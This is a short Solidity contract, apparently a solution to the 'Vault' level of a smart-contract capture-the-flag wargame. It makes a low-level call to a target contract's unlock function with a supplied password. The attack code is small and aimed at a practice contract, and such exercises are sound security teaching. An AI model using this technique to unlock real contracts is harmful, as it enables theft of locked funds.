pragma solidity ^0.4.18;

import "levels/Vault.sol";

contract VaultHack {
    Vault target;

    function VaultHack(address _target) public {
        target = Vault(_target);
    }

    function attack(bytes32 _password) public {
        target.call(bytes4(keccak256("unlock(bytes32)")), _password);
    }

}